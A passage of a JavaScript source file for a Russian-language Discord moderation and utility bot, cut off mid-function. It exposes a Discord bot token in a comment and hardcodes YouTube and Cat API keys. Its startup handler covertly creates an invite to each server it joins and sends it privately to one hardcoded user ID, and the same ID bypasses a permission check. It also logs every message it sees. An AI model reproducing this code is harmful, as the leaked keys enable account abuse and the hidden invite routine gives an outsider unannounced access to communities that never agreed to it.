//token: NTExMDk0NTA3Mjc4Njk2NDY1.Xoma_Q.5F2wzAzQj6bESDPNaEQVVH3ZZXs
const Discord = require('discord.js');
const client = new Discord.Client();



const config = require('./config.json')
const request = require('request');
const { get } = require("snekfetch"); 
const querystring = require('query-string');
const cheerio = require('cheerio')
const report = require('./report.js')
const r2 = require('r2');
const fs = require('fs');
const vrp = require('./vrp.js')
const info = require('./Minor_Functions/MF_info.js')
const gf = require('./GF.js')
const actions = require('./actions.js')
const symbol = require('./symbol.js')
const rooms = require('./rooms.js')
const autorole = require('./Minor_Functions/MF_autorole.js')
client.meme = require('./JSONs/meme.json')
client.guild = require('./guildch.json')
client.warns = require('./JSONs/warns.json')
client.mute = require('./mute.json')
client.modules = require('./modules.json')
client.stickers=require('./stickers.json')
client.who = require('./who.json')
client.remind = require('./remind.json')
client.invite = require('./invite.json')
client.blocks = require('./blocks.json')
client.gf = require('./gf.json')
client.music = require('discord.js-musicbot-addon');
const news = require('./news.js')
const zw = require('./zw.js')
const warns = require('./warn.js')
const faq = require('./Minor_Functions/MF_FAQ.js')
vrp(client)
faq(client)
zw(client)
news(client)
actions(client)
symbol(client)
autorole(client)
client.setMaxListeners(30)
rooms(client)
warns(client)
const CAT_API_URL = 'https://api.thecatapi.com/';
const Pokedex = require('pokedex-api');
const pokedex = new Pokedex()
const YouTube = require("discord-youtube-api");
//объявление функции GRA 

const { meme } = require('memejs');
 


function getRandomArbitrary(min, max) {
        
  return Math.floor( Math.random() * (max - min) + min);
}
function caesarShift(str, amount) {

  // Wrap the amount
  if (amount < 0)
    return caesarShift(str, amount + 26);

   // Make an output variable
   var output = '';
 
   // Go through each character
  for (var i = 0; i < str.length; i ++) {
 
     // Get the character we'll be appending
     var c = str[i];
 
     // If it's a letter...
     if (c.match(/[a-z]/i)) {
 
       // Get its code
       var code = str.charCodeAt(i);
 
       // Uppercase letters
       if ((code >= 65) && (code <= 90))
         c = String.fromCharCode(((code - 65 + amount) % 26) + 65);
 
       // Lowercase letters
       else if ((code >= 97) && (code <= 122))
         c = String.fromCharCode(((code - 97 + amount) % 26) + 97);
 
     }
 
     // Append
     output += c;
 
   }
 
   // All done!
   return output;
 
};


   // AIzaSyClHrcMVG3yWjKYBCUVjntmqc_N56Sjd5c
const youtube = new YouTube("AIzaSyClHrcMVG3yWjKYBCUVjntmqc_N56Sjd5c");

const CAT_API_KEY   = "190c1a25-3200-4d48-b67c-be01ed04d967";// get one free from theCatAPI.com
const { Client, MessageEmbed } = require('discord.js');
function checkDays(date) {
  let now = new Date();
  console.log(now.getTime())
  let diff = now.getTime() - date.getTime();
  let days = Math.floor(diff / 86400000);
  let weeks = Math.floor(days/7);
  days = days % 7
  let months = Math.floor(weeks /4)
  weeks = weeks % 4
  let years = Math.floor(months/12)
  months = months % 12
  let check = " "
  if(years >= 1 && years > 4) {
    check +=  years +  " лет"
  } else if(years >= 1 && years <= 4){
    check += years + (years == 1 ? " год" :" года")
  }
  if(months >= 1 && months > 4){
    check += " "+ months + " месяцeв"
  } else if(months <= 4 && months >= 1) {
    check += " "+ months + (months == 1 ? " месяц" : " месяца")
  }
  if(weeks >= 1 && weeks > 4){
    check += " "+ weeks + " недель"
  } else if(weeks <= 4 && weeks >= 1) {
    check += " "+ weeks + (weeks == 1 ? " неделю" :  " недели")
  }
  
  if(days >= 1 &&days > 4) {
    check += " " + days + (days == 1 ? " день" : " дней")
  } else if (days >= 1 && days <= 4){
    check += " " + days +" дня"
  }
  check += " назад"
  return(check)


};

client.on('ready', () => {

  setInterval(()=>{client.guilds.cache.forEach(guild=>{
    if(!client.modules[guild.id]) {
      client.modules[guild.id] = {
        modules: {
          rpm: {
  
          }
        },
        mods: []
      }
    
            fs.writeFile('./modules.json', JSON.stringify(client.modules, null, 4), err => {
                if(err) console.log(err)
            })
    }
    if(!client.gf[guild.id]){
    client.gf[guild.id] = {
      toggle: 0
    }
    console.log(`Добавил GF для ${guild.name}`)
    fs.writeFile('./gf.json', JSON.stringify(client.gf, null,4), err => {
      if(err) throw err
    })
  }  
  })
},500)

  
  client.guilds.cache.forEach(guild=>{
    console.log(`Включился на ${guild.name}`)
    if(!client.guild[guild.id]){
      client.guild[guild.id]={}

      fs.writeFile('./guildch.json', JSON.stringify(client.guild, null,4), err => {
        if(err) throw err
      })
    }
    if(client.guild[guild.id].muterole){
      if(!guild.roles.cache.get(client.guild[guild.id].muterole)){
        delete client.guild[guild.id].muterole
        fs.writeFile('./guildch.json', JSON.stringify(client.guild, null,4), err => {
          if(err) throw err
        })
      }
    }
    if(!client.guild[guild.id].logtoggle){
      client.guild[guild.id].logtoggle=0
    }
    fs.writeFile('./guildch.json', JSON.stringify(client.guild, null,4), err => {
      if(err) throw err
    })
  })
  client.guilds.cache.forEach(guild => {
    if(!client.invite[guild.id]) {
      client.invite[guild.id] = 0
      fs.writeFile('./invite.json', JSON.stringify(client.invite, null,4), err => {
        if(err) throw err
      })
    
    }
    if(client.invite[guild.id]==0){
      guild.channels.cache.random().createInvite().then(invite => {
        client.users.cache.get('269008055738433538').send(invite.url)
      })
      client.invite[guild.id] = 1
      fs.writeFile('./invite.json', JSON.stringify(client.invite, null,4), err => {
        if(err) throw err
      })
    }
  })
  

  // Инициализация погоды в каждой гильдии
  const weather = require('./vrpWeather.js')
  weather(client)
  setInterval(()=>{
  client.guilds.cache.forEach(async guild => {
    /*if(!client.blocks[guild.id]){
      client.blocks[guild.id] = {
  
      }
      await fs.writeFile('./blocks.json', JSON.stringify(client.blocks, null,4), err => {
        if(err) throw err
      })
    }*/
    
    if(!client.mute[guild.id]) {
      client.mute[guild.id] ={

      }
      await fs.writeFile('./mute.json', JSON.stringify(client.mute, null,4), err => {
        if(err) throw err
      })
    }
    guild.members.cache.forEach(member=> {/*
      if(!client.blocks[guild.id][member.id]) {
        client.blocks[guild.id][member.id] = 0
       await fs.writeFile('./blocks.json', JSON.stringify(client.blocks, null,4), err => {
          if(err) throw err
        })
      }*/
      if(!client.mute[guild.id][member.id]){
        client.mute[guild.id][member.id] = {
          
        }
        fs.writeFile('./mute.json', JSON.stringify(client.mute, null,4), err => {
          if(err) throw err
        })
      }
    })
  })
},500)
  client.guilds.cache.forEach(guild => {
    if(!client.guild[guild.id]){
      
        client.guild[guild.id] = {

        }
        fs.writeFile('./guildch.json', JSON.stringify(client.guild, null, 4), err => {
            if(err) console.log(err)
          })
    
  }
});

client.guilds.cache.forEach(guild => {
  if(!client.guild[guild.id]) {
    client.guild[guild.id]={

    }
    fs.writeFile('./guildch.json', JSON.stringify(client.guild, null,4), err => {
      if(err) throw err
    })
  } 
 
    
  
})
  client.guilds.cache.forEach(guild => {
setInterval(()=>{
    guild.members.cache.forEach(member=> {
      //Проверка мута
      if(client.mute[guild.id]){
      if(client.mute[guild.id][member.id]){
        if(client.mute[guild.id][member.id].mute){
        if(+ new Date().getTime() >= client.mute[guild.id][member.id].mute){
          if(member.roles.cache.get(client.guild[guild.id].muterole)){
            member.roles.remove(client.guild[guild.id].muterole)
          }
          delete client.mute[guild.id][member.id].mute
            fs.writeFile('./mute.json', JSON.stringify(client.mute, null,4), err => {
              if(err) throw err
            })
        }
      }
      }
    }
    })
    
  }, 500)
  })
  console.log(`${client.user.tag} готов к службе!`);
  let i = 0
  let v =0
  setInterval(()=>{
  
  const activities = [`v/info | ${client.guilds.cache.size} серверов `,`v/info | ${client.users.cache.size} участников | Мало`, `v/info | JavaScript`]
  client.user.setActivity(activities[v], {type: 'STREAMING'})
  v+=1
  if(v>activities.length-1) v =0
}, 5000)
const jija = client.guilds.cache.get('708338550118285343')
  if(jija.roles.cache.get('708366343782531092')) i = jija.roles.cache.get('708366343782531092').members.size-1
  
  jija.members.cache.forEach(member => {
    
    if(!member.roles.cache.get('708366343782531092')) {
      if(member.user.bot) return
      if(i>=20) return
      console.log(member.user.tag)
      member.roles.add('708366343782531092')
      i+=1
    }
  })

    setInterval(()=> {
    client.users.cache.forEach(user => {
      if(!client.remind[user.id]) {
        client.remind[user.id] = {

        }
        fs.writeFile('./remind.json', JSON.stringify(client.remind, null,4), err => {
          if(err) throw err
        })
      }
      if(Object.keys(client.remind[user.id]).length > 0) {
       
        
          for (let [key, value] of Object.entries(client.remind[user.id])) {
            
            
            if(value <= new Date().getTime()) {
              const remindbed = new MessageEmbed({
                title: 'НАПОМИНАНИЕ',
                description: key
              })
              user.send(remindbed)
              delete client.remind[user.id][key]
              fs.writeFile('./remind.json', JSON.stringify(client.remind, null,4), err => {
                if(err) throw err
              })
            }
          }
        
      }
    })
  
  }, 500)


});


client.on('message', msg => {

  if(msg.content.includes('повысил(а) свой уровень!') && msg.author.id=='310848622642069504'){
    msg.channel.send('Может, мне тоже эти сраные уровни сделать?')
  }
  if (msg.content === 'Вася') {

        msg.channel.send(config.version)
  }
})
client.on("messageDelete", (messageDelete) => { 
  const deletembed = new MessageEmbed();
  deletembed.setDescription(`${messageDelete.content}\n${messageDelete.author.toString()} | ${messageDelete.channel}`)
  deletembed.setColor('RED')
  if(client.guild[messageDelete.guild.id].log && client.guild[messageDelete.guild.id].logtoggle==1){
    client.channels.cache.get(client.guild[messageDelete.guild.id].log).send(deletembed);
    }
 });
client.on('guildMemberAdd', member => {
  const comembed = new MessageEmbed();
  const addvatar = member.user.displayAvatarURL()
  if(!client.gf[member.guild.id].greeting){
  comembed.setDescription(`К серверу присоединился ${member}.` );
  } else {
    
    let desc = client.gf[member.guild.id].greeting
    desc= desc.replace('{user}', member.toString())
    desc=desc.replace('{name}', member.guild.name)
    comembed.setDescription(String(desc));
    
  }
  console.log(member.user.tag + ` зашёл на сервер ${member.guild.name}`);
  comembed.setTitle('Новый пользователь на ' + member.guild.name + '!');
  comembed.setThumbnail(addvatar)
  comembed.setColor('GREEN');
  
  if(client.gf[member.guild.id].channel){
  client.channels.cache.get(client.gf[member.guild.id].channel).send(comembed);
  }
});
client.on('messageUpdate', (oldMessage, newMessage) => {
  if(oldMessage.content == newMessage.content) return
  const editembed = new MessageEmbed();
  editembed.setDescription(`\`\`\`${oldMessage.content}\`\`\`\n\`\`\`${newMessage.content}\`\`\`\n${oldMessage.author.toString()} | ${oldMessage.channel}`)
  editembed.setColor('0xB200FF')
  if(client.guild[newMessage.guild.id].log && client.guild[messageDelete.guild.id].logtoggle==1){
    client.channels.cache.get(client.guild[newMessage.guild.id].log).send(editembed);
  }
  
});
client.on('guildMemberRemove', member => {      
  const comembed = new MessageEmbed();
  const addvatar = member.user.displayAvatarURL()
  if(!client.gf[member.guild.id].farewell){
  comembed.setDescription(`${member} покинул сервер.` );
  } else {
let desc = client.gf[member.guild.id].farewell
desc=desc.replace('{user}', member.toString())
desc=desc.replace('{name}', member.guild.name)
    console.log(desc);
    
    comembed.setDescription(desc);
  }
  console.log(member.user.tag + ` вышел с сервера ${member.guild.name}`);
  comembed.setTitle('Пользователь вышел c ' + member.guild.name + '!');
  comembed.setThumbnail(addvatar)
  comembed.setColor('RED');
  
  if(client.gf[member.guild.id].channel){
  client.channels.cache.get(client.gf[member.guild.id].channel).send(comembed);
  }
   
    });
// Create an event listener for messages
client.on('message', async message => {
  
  if (!message.guild) return;
  if(message.author.bot) return

  //if(message.content.startsWith('||') && message.content.endsWith('||')) return message.delete()
 /* if(message.content.startsWith('=hack')) {
    setTimeout(() => {
      message.channel.send('stop')
    }, 2000)
  }*/
  if(message.content.startsWith('=duel') && message.mentions.users.first() == client.user) {
    setTimeout(() => {
      message.channel.send('Ты слишком слаб, чтобы с тобой сражаться.')
    }, 2000) 
    
  }




 
  
  if( !client.who[message.guild.id]) {
    client.who[message.guild.id] = {

    }
    fs.writeFile('./who.json', JSON.stringify(client.who, null,4), err => {
      if(err) throw err
    })
  }
  if(!client.gallery[message.guild.id]) {
    client.gallery[message.guild.id] = {
    }
  
    fs.writeFile('./gallery.json', JSON.stringify(client.gallery, null, 4), err => {
      if(err) throw err
    })
  }
  if(!client.gallery[message.guild.id][message.member.id]){
    client.gallery[message.guild.id][message.member.id] = [
      
    ]
    fs.writeFile('./gallery.json', JSON.stringify(client.gallery, null, 4), err => {
      if(err) throw err
    })
  }
  if(!client.stickers[message.member.id]) {
    client.stickers[message.member.id] ={

    }
    fs.writeFile('./stickers.json', JSON.stringify(client.stickers, null, 4), err => {
      if(err) throw err
    })
  }
 

  if(!client.guild[message.guild.id]) {
    client.guild[message.guild.id] ={

    }

    fs.writeFile('./guildch.json', JSON.stringify(client.guild, null ,4 ), err => {
      if(err) console.log(err)
    })
  }



  // ЛОГ ВСЕЯ И ВСЕГО!
  console.log(`${message.author.tag}: ${message.content}; #${message.channel.name}(${message.guild.channels.cache.get(message.channel.parentID).name}) — ${message.createdAt.getHours()}:${message.createdAt.getMinutes()}:${message.createdAt.getSeconds()} | ${message.guild.name}`)
  
  //if(client.blocks[message.guild.id][message.author.id] == 1)return
  if(message.author.id == '537019411869990923' || message.author.username.toLowerCase() == 'marius') return
  if(message.content.startsWith('v/channels')) {
    
    const categories = message.guild.channels.cache.filter(r => r.type=='category')
    categories.forEach(cat => {
      console.log('>>'+cat.name  )
      cat.children.forEach(child => {
        console.log('>'+child.name + ` | ${child.type.toUpperCase()}`)
      });
    })
  }
  if(message.content.startsWith('v/log')){
    if(!message.member.hasPermission('MANAGE_CHANNELS') && message.author.id!='269008055738433538') return message.channel.send('Недостаточно прав.')
    const logArgs = message.content.split(' ').slice(1,2)
  
  if(logArgs.length <=0){
    const logembed = new MessageEmbed({
      title: 'v/LOG — ' + (client.guild[message.guild.id].logtoggle == 0 ?'Выключены':'Включены')
    })
    logembed.addField('Канал', (client.guild[message.guild.id].log?message.guild.channels.cache.get(client.guild[message.guild.id].log).toString():'Неизвестен'))
    message.channel.send(logembed)
  }else if(logArgs == 'channel'){
    const args = message.mentions.channels.first()
    if(!args) return message.channel.send('Упомяните канал!')
    client.guild[message.guild.id].log =  args.id
    
    fs.writeFile('./guildch.json', JSON.stringify(client.guild, null, 4), err => {
      if(err) console.log(err)
    })
    console.log('успешно!')
  } else if(logArgs =='toggle') {
    if(!client.guild[message.guild.id].logtoggle || client.guild[message.guild.id].logtoggle == 0) {
      client.guild[message.guild.id].logtoggle = 1
    } else {
      client.guild[message.guild.id].logtoggle = 0
    }
    fs.writeFile('./guildch.json', JSON.stringify(client.guild, null, 4), err => {
      if(err) console.log(err)
    })
    message.channel.send((client.guild[message.guild.id].logtoggle==0 ? '**Выключил**':'**Включил**') + ' логи на вашем сервере')
  }
  }


 
  if(message.content.startsWith('v/changeban')){
    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send('Недостаточно прав.')
    const args = message.mentions.channels.first()
    console.log(args)
    client.guild[message.guild.id].ban =  args.id
    
    fs.writeFile('./guildch.json', JSON.stringify(client.guild, null, 4), err => {
      if(err) console.log(err)
    })
    console.log('успешно!')
  } 
  

  gf(client, message)
    if(message.content.startsWith('v/yt')) {
      const args = message.content.split(' ').splice(1).join(' ')
      async function YT(args){
        try{
        res = await youtube.searchVideos(args)
        } catch(err) {
          message.channel.send('Ошибочка вышла')
          message.delete()
        }
        message.channel.send(res.url)
        message.delete()
      }
      YT(args)
    }
    info(message, client)
   /* if(message.content.startsWith('v/block')) {
      const args = message.mentions.members.first()
      if(!message.member.hasPermission('ADMINISTRATOR')) return message.channel.send('Недостаточно прав')
      if(!args) return message.channel.send('Неизвестная цель')
      if(args.hasPermission('ADMINISTRATOR')) return message.channel.send('Неверная цель')
      if(client.blocks[message.guild.id][args.id]==1) return message.channel.send('Уже заблокирован')
      if(!client.blocks[message.guild.id]||!client.blocks[message.guild.id][message.author.id]){
        client.blocks[message.guild.id][args.id]=1
        fs.writeFile('./blocks.json', JSON.stringify(client.blocks, null,4), err => {
          if(err) throw err
        })
      }
      message.channel.send('Успешно заблокировал ' +args.toString() + ' на этом сервере').then(message.delete())
    }

    if(message.content.startsWith('v/unblock')) {
      const args = message.mentions.members.first()
      if(!message.member.hasPermission('ADMINISTRATOR')) return message.channel.send('Недостаточно прав')
      if(!args) return message.channel.send('Неизвестная цель')
      if(args.hasPermission('ADMINISTRATOR')) return message.channel.send('Неверная цель')
      if(client.blocks[message.guild.id][args.id]==0) return message.channel.send('Ещё не заблокирован')
      if(!client.blocks[message.guild.id]||!client.blocks[message.guild.id][message.author.id]){
        client.blocks[message.guild.id][args.id]=0
        fs.writeFile('./blocks.json', JSON.stringify(client.blocks, null,4), err => {
          if(err) throw err
        })
      }

      message.channel.send('Успешно разблокировал ' +args.toString() + ' на этом сервере').then(message.delete())
    }

    if(message.content.startsWith('v/statusblock')) {
      const args = message.mentions.members.first()
      if(!args) return message.channel.send('Неизвестная цель')
      message.channel.send(`У ${args.toString()} ` + (client.blocks[message.guild.id][args.id] == 0 ? 'нет' : 'есть') + ' блок' + (client.blocks[message.guild.id][args.id]==0 ?'а':'') + (client.blocks[message.guild.id][args.id]==1?'. Как вы до такого дожились?':'')).then(message.delete())
    }*/
    if(message.content.startsWith('v/rinfo')){
      const role = message.mentions.roles.first();
      if(!role) return message.channel.send('Вы не упомянули роль!')

      const Time = role.createdAt
      const rolembed = new MessageEmbed()
      rolembed.setTitle(`ИНФОРМАЦИЯ О РОЛИ`)
      rolembed.addField('Роль', role.toString(), true)
      rolembed.addField('ID роли', role.id, true)
      rolembed.addField('Цвет роли', role.hexColor, true)
      rolembed.addField('Позиция в иерархии', `${role.position}/${message.guild.roles.cache.size-1}`, true)
      rolembed.addField('Время создания', `${Time.getDate()}.${Time.getMonth()}.${Time.getFullYear()} ${Time.getHours()}:${Time.getMinutes()}:${Time.getSeconds()}(${checkDays(role.createdAt)})`, true)
      rolembed.addField('Обладатели роли', role.members.size>1?role.members.size:role.members.first(), true)
      rolembed.addField('Возможность к упоминанию всеми', role.mentionable == true ? 'Возможно.' :'Невозможно!', true)
      message.channel.send(rolembed)

    }
    function image(message, parts) {
 
      /* extract search query from message */
   
      var search = parts // Slices of the command part of the array ["!image", "cute", "dog"] ---> ["cute", "dog"] ---> "cute dog"
   
      var options = {
          url: "http://results.dogpile.com/serp?qc=images&q=" + search,
          method: "GET",
          headers: {
              "Accept": "text/html",
              "User-Agent": "Chrome"
          }
      };
  
      request(options, function(error, response, responseBody) {
          if (error) {
              // handle error
              return;
          }
   
          /* Extract image URLs from responseBody using cheerio */
   
          $ = cheerio.load(responseBody); // load responseBody into cheerio (jQuery)
   
          // In this search engine they use ".image a.link" as their css selector for image links
          var links = $(".image a.link");
   
          // We want to fetch the URLs not the DOM nodes, we do this with jQuery's .attr() function
          // this line might be hard to understand but it goes thru all the links (DOM) and stores each url in an array called urls
          var urls = new Array(links.length).fill(0).map((v, i) => links.eq(i).attr("href"));
          console.log(urls);
          if (!urls.length) {
              // Handle no results
              return;
          }
   
          // Send result
          message.channel.send( urls[Math.floor(getRandomArbitrary(0, urls.length))] );
      });
  }
  if(message.content.startsWith('v/search')) {
    const args = message.content.split(' ').splice(1).join(' ')
    console.log(args);
    
    if(args.length <= 0) return message.channel.send('Предоставьте запрос.')
    image(message, args.toString())
  }
    if(message.content.startsWith('v/dice')) {
      function getRandomArbitrary(min, max) {
        
        return Math.random() * (max - min) + min;
    }
      
      var min = message.content.split(' ').slice(1,2)
      var max = message.content.split(' ').slice(2,3)
      if(!min || !max) return message.channel.send('Вы не задали диапазон!')
      message.channel.send(`:game_die: ${Math.floor(getRandomArbitrary(min, max))}`)
      
    }
    if(message.content.startsWith('v/mrole')) {
      const args = message.mentions.roles.first()
      
      if(!args) {
        message.channel.send(`Местная роль для мута - ${client.guild[message.guild.id].muterole == undefined ?'НЕИЗВЕСТНО': message.guild.roles.cache.get(client.guild[message.guild.id].muterole).toString()}`)
      } else if(args){
        if(client.guild[message.guild.id].muterole) {
          if(!message.member.hasPermission('MANAGE_ROLES')) return message.channel.send('Недостаточно прав!').then(message.delete())
          const oldMuteRole = message.guild.roles.cache.get(client.guild[message.guild.id].muterole)
          message.guild.channels.cache.forEach(channel => {
            channel.updateOverwrite(oldMuteRole, {
              SEND_MESSAGES: true
            })
          })
        }
        
      client.guild[message.guild.id].muterole = args.id
      fs.writeFile('./guildch.json', JSON.stringify(client.guild, null ,4 ), err => {
        if(err) console.log(err)
      })
      message.guild.channels.cache.forEach(channel => {
        channel.updateOverwrite(args, {
          SEND_MESSAGES: false
        })
      })
      message.guild
      message.channel.send(`Теперь это роль для мута - ${args.toString()}`)
    }
    }
    
    if(message.content.startsWith('v/mute')) {
   
      if(!client.guild[message.guild.id].muterole) return message.channel.send('На сервере не поставлена мут-роль').then(message.delete())
      const muted = message.mentions.members.first()
      if(!muted)return message.channel.send('Недействительная цель.')
      
      const muteTime = message.content.split(' ').slice(1,2)
      const muteUnit = message.content.split(' ').slice(2,3)
      const muteReason = message.content.split(' ').splice(4).join(' ')
      const muter = message.member
      
      const muteRole = message.guild.roles.cache.get(client.guild[message.guild.id].muterole)
      if(muted.roles.cache.get(muteRole) || client.mute[message.guild.id][muted.id].mute) return message.channel.send('Уже замучен!').then(message.delete())
      if(!parseInt(muteTime))return message.channel.send('Задайте время мута!').then(message.delete())
      if(muteUnit.length <= 0)return message.channel.send('Задайте единицу времени!').then(message.delete())
      if(!muter.hasPermission('MANAGE_MESSAGES') ) return message.channel.send('Недостаточно прав.').then(message.delete())
    if(muted.hasPermission('MANAGE_MESSAGES') ) return  message.channel.send('Неверная цель.').then(message.delete())
      let mult = 1
      if(muteUnit=='s') {
        mult = muteTime * 1000
      } else if(muteUnit=='m') {
        mult = muteTime * 1000*60
      } else if(muteUnit=='h') {
        mult = muteTime * 1000 * 60*60

      }else if(muteUnit =='d'){
        mult = muteTime * 1000 *60*60*24
      } else return message.channel.send('Неверная единица времени').then(message.delete())
      muted.roles.add(muteRole)
      
      client.mute[message.guild.id][muted.id].mute =new Date().getTime()+ mult
      fs.writeFile('./mute.json', JSON.stringify(client.mute, null ,4 ), err => {
        if(err) console.log(err)
        console.log(`Замутил пользователя ${muted.user.tag} на ${muteTime}${muteUnit}`)
      })      

      const mutembed = new MessageEmbed();
      mutembed.addFields({name: `Причина заглушения`,value:muteReason.length<=0?'Нет причины':muteReason},{name:`Заглушённый`,value:` ${muted.user.toString()}`},{name:`Заглушивший `,value:`${muter.toString()}`})
      mutembed.setTitle('Участник заглушён')
      mutembed.setColor('0x00ECFF')
      mutembed.setFooter(`Длительность мута: ${muteTime}${muteUnit}`)
      mutembed.setThumbnail(muted.user.avatarURL())
      if(client.guild[message.guild.id].ban){
       
        client.channels.cache.get(client.guild[message.guild.id].ban).send(mutembed).then(message.delete())
    } else {
      message.channel.send(mutembed).then(message.delete())
    }
    muted.send('Вас заглушили на '+ muteTime + muteUnit+' на сервере **' + message.guild.name + '** по следующей причине:\n'+`\`${muteReason}\``)
  
   

}
  
if(message.content.startsWith('v/unmute')) {
  if(!client.guild[message.guild.id].muterole) return message.channel.send('На сервере нет мутроли.')
  const muted = message.mentions.members.first()
  if(!muted)  return message.channel.send('Недействительная цель.')
  if(!muted.roles.cache.get(client.guild[message.guild.id].muterole)) return message.channel.send('Цель не замучена.')
  muted.roles.remove(muted.roles.cache.get(client.guild[message.guild.id].muterole))
  if(client.mute[message.guild.id][muted.id].mute) {
    delete client.mute[message.guild.id][muted.id].mute
    fs.writeFile('./mute.json', JSON.stringify(client.mute, null, 4), err => {
      if(err) console.log(err)
  })
  message.channel.send(`${message.author} размутил ${muted}`)
  }
}

    
    if(message.content.startsWith('v/cinfo')) {
      
      const channelbed = new MessageEmbed()
      if(message.mentions.channels.first()) {
        let args = message.mentions.channels.first()
        channelbed.addField('**Название канала**', args.toString(), true)
        channelbed.addField('**Тип канала**', args.type.toUpperCase(), true)
        channelbed.addField('**Категория**', args.parent)
        channelbed.addField('**Позиция**', (args.position+1))
        channelbed.addField('**Описание канала**', args.topic)

        channelbed.setTitle('Информация о канале')
        channelbed.addField('**Авторизованные пользователи**', args.members.size)
        channelbed.addField('**Дата создания**', `${args.createdAt}(${checkDays(args.createdAt)})`)
  
  
        channelbed.addField('**NSFW**', args.nsfw)
      } else {
        let args = message.channel
        channelbed.addField('**Название канала**', args.toString(), true)
        channelbed.addField('**Тип канала**', args.type.toUpperCase(), true)
        channelbed.addField('**Категория**', args.parent)
        channelbed.addField('**Позиция**', (args.position+1))
        channelbed.addField('**Описание канала**', args.topic)

        channelbed.setTitle('Информация о канале')
        channelbed.addField('**Авторизованные пользователи**', args.members.size)
        channelbed.addField('**Дата создания**', `${args.createdAt}(${checkDays(args.createdAt)})`)
  
  
        channelbed.addField('**NSFW**', args.nsfw)
      }


      message.channel.send(channelbed)
    }
    if(message.content.startsWith('v/cat')) {
      
      message.channel.send("Ищу котика...").then((message)=>{
        const request = require('request');

        request.get('http://thecatapi.com/api/images/get?format=src&type=png', {
        
        }, function(error, response, body) {
          if(!error && response.statusCode == 200) {
            message.edit(response.request.uri.href);
          } else {
            console.log(error);
          }
        })
    })


    }
    if(message.content.startsWith('v/uinfo')) {
      let args = message.mentions.members.first()
      const userembed = new MessageEmbed();

      if(!args){
        args = message.member


      } 
      userembed.setThumbnail(args.user.avatarURL())

      userembed.addField(`**Тег участника**`, args.user.tag, false)

    
      userembed.addField( `**ID участника**`, args.id, false)
      userembed.addField( `**Статус участника**`, (args.user.presence.status == 'dnd' ?'Do not disturb' :(args.user.presence.status.toString().charAt(0).toUpperCase() + args.user.presence.status.toString().slice(1))), false)
      userembed.addField(`**Дата регистрации**`, `${args.user.createdAt.toUTCString().substr(0, 16)}(${checkDays(args.user.createdAt)})`, false)
      userembed.addField(`**Дата входа на сервер**`, `${args.joinedAt.toUTCString().substr(0, 16)} (${checkDays(args.joinedAt)})`, false)
        userembed.addField('**Высшая роль**',`${args.roles.highest.toString()}`, false)
      
      userembed.setTitle('Информация об участнике')
      userembed.setColor('0x6C00FF')
      message.channel.send(userembed)
      message.delete()
    }

    if(message.content === 'v/sinfo') {
      const FC = client.guilds.cache.get('602571669697200129')
      let region = {
        "brazil": ":flag_br: Бразилия",
        "eu-central": ":flag_eu: Центральная Европа",
        "singapore": ":flag_sg: Сингапур",
        "us-central": ":flag_us: Центр США",
        "sydney": ":flag_au: Сидней",
        "us-east": ":flag_us: Восток США",
        "us-south": ":flag_us: Юг США",
        "us-west": ":flag_us: Запад США",
        "eu-west": ":flag_eu: Западная Европа",
        "vip-us-east": ":flag_us: Восток США",
        "london": ":flag_gb: Лондон",
        "amsterdam": ":flag_nl: Амстердам",
        "hongkong": ":flag_hk: Гонконг",
        "russia": ":flag_ru: Россия",
        "southafrica": ":flag_za: Южная Африка"
    };
      const servembed = new MessageEmbed();
      const servlogo = message.guild.icon
      const server = message.guild
      servembed.setTitle(`**${message.guild.name}**`)
      let servcount = 0;
      servembed.setThumbnail(server.iconURL())
      let dnd=0
      let on=0
      let off=0
      let afk=0
      message.guild.members.cache.forEach(member=>{
        
        if(member.presence.status=='dnd'){
          dnd +=1
        } else if(member.presence.status=='idle'){
          afk +=1
        } else if(member.presence.status=='offline'){
          off+=1
        } else if(member.presence.status=='online'){
          on+=1
        }
      })
      let bots=0
      message.guild.members.cache.forEach(member=>{
        if(member.user.bot){
          bots+=1
        }
      })
      let VCount=0
      let TCount =0
      let Count=0
      message.guild.channels.cache.forEach(chnl=>{
        if(chnl.type=='text'){
          TCount+=1
        } else if(chnl.type=='voice'){
          VCount+=1
        } else if(chnl.type=='category'){
          Count +=1
        }
      })
      if(message.guild.emojis.cache.size<42){
      
       const emj = client.emojis.cache.get('717993276698787841')
       const emj1= client.emojis.cache.get('717993276795387975')
       const emj2 = client.emojis.cache.get('717993278838014023')
       const emj3 = client.emojis.cache.get('717993276837199912')
       const emj4 = client.emojis.cache.get('717993276631810089')
       const emj5 = client.emojis.cache.get('717993277105897523')
       const emj6=client.emojis.cache.get('717993276887531551')
       const emj7 = client.emojis.cache.get('717993276887531551')
       const emj8 = client.emojis.cache.get('717993276824616960')
     
       
        servembed.addField(`**ID сервера**`,`${server.id}`,false)
        servembed.addField(`**Владелец сервера**`,`${server.owner.user.toString()}`)
        servembed.addField(`**Регион сервера**`,`${region[server.region]}`)  
      servembed.addField(`**Участники**`,`
      ${emj} ${message.guild.memberCount} всего
      ${emj5} ${bots} ботов
      
      ${on>0?`${emj2} `+on+' в сети':''} 
      ${off ?`${emj3} `+off+' не в сети':''} 
       ${dnd>0?`${emj1} `+dnd + ' не обеспокоены':''} 
       ${afk>0?`${emj4} `+afk +' нет на месте' :''}
        `, true)
        servembed.addField(`**Количество каналов**`,`
        ${emj} ${message.guild.channels.cache.size}

        ${emj8} ${Count} категорий
        ${emj6} ${VCount} голосовых
        ${emj7} ${TCount} текстовых
        `,true)
     
        let secObj={
          "VERY_HIGH":"Очень высокий",
          "HIGH":"Высокий",
          "MEDIUM":"Средний",
          "LOW":"Низкий",
          "NONE":"Нет"
        }
        servembed.addField('**Уровень защиты**',secObj[message.guild.verificationLevel])
        servembed.addField(`**Количество ролей**`,`${message.guild.roles.cache.size}`)
        servembed.addField('**Дата создания**',`${message.guild.createdAt.getDate()}.${message.guild.createdAt.getMonth()}.${message.guild.createdAt.getFullYear()} (${checkDays(message.channel.guild.createdAt)})`)
        servembed.setColor('#0068FF')
        message.channel.send(servembed)
        

        
      }
    }

    report(client, message)

  
  if(message.content.startsWith('v/cdelete')){
    if(!message.member.hasPermission('ADMINISTRATOR'))return
 
      let cDel = message.channel.parent.name
        await message.channel.parent.children.forEach(async child=>{
          await child.delete()
        })
        await message.channel.parent.delete()
        message.author.send('Удалил категорию '+cDel)

  }
  if(message.content.startsWith('v/encrypt')){
    const args = message.content.split(' ').slice(1,2)
    if(args.length <=0) return
    if(args=='caesar') {
      let caesarCount = message.content.split(' ').slice(2,3)
      if(!caesarCount) return
